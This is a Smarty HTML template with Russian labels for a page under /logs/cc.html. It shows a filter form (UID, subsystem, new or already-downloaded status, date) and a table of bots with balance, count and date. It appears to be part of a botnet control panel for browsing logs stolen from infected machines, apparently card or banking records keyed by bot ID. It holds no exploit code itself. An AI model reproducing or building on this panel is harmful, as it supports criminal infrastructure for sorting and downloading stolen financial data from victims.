<div class="top_menu">
<div class="top_menu_left">
{if $_SESSION.user->access.logs.cberfiz eq on}<a href="/logs/index.html">Простые логи</a>&nbsp;{/if}
</div>

<div class="top_menu_right">

</div>

</div>

<hr />


<form action="/logs/cc.html" method="post" enctype="multipart/form-data" name="cc_filter" id="cc_filter" target="_blank">

<div style="text-align: right; padding-right: 10px; padding-left: 10px">

UID: <input name="uid" type="text" style="width:600px" value="{$_SESSION.search.cc.uid}"/>
<hr />
Система: <select id="subsys" name="subsys" style="width:600px">
<option value="ALL">{$lang.all}</option>
{foreach from=$sys key=key item=item}
<option value="{$key}"{if $_SESSION.search.cc.subsys eq $key} selected="selected"{/if}>{$key}</option>
{/foreach}
</select>
<hr />
Статус: <select name="save" style="width:600px">
<option value="">Все</option>
<option value="nuls"{if $smarty.post.save eq 'nuls'}selected="selected"{/if}>Новые</option>
<option value="1"{if $smarty.post.save eq '1'}selected="selected"{/if}>Старые (Когда либо скачанные)</option>
</select>
<hr />
Дата: <select id="date" name="date" style="width:600px">
<option value="ALL">{$lang.all}</option>
{foreach from=$date key=key item=item}
<option value="{$key}"{if $_SESSION.search.cc.date eq $key} selected="selected"{/if}>{$key}</option>
{/foreach}
</select>
<hr />
<input type="button" name="update" value="Обновить" style="width:80%" onclick="return get_hax({ldelim}url: '/logs/cc.html?ajax=1',method:'post',id:'content',form:'cc_filter'{rdelim});" /> <input type="submit" name="saves" value="Сохранить" style="width:19%" />
</div>
</form>

<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>

<table cellspacing="1" cellpadding="5" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
<td style="width: 30%; text-align: center">{$lang.bot}</td>
<td style="width: 25%; text-align: center">{$lang.balance}</td>
<td style="width: 20%; text-align: center">{$lang.count}</td>
<td style="width: 25%; text-align: center">{$lang.data}</td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;" onclick="gbwcc('{$item->prefix}{$item->uid}');">
<th>{$item->prefix}{$item->uid}</th>
<th>{$item->balance}</th>
<th>{$item->count}</th>
<th>{$item->post_date}</th>
</tr>
{/foreach}
</table>



<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>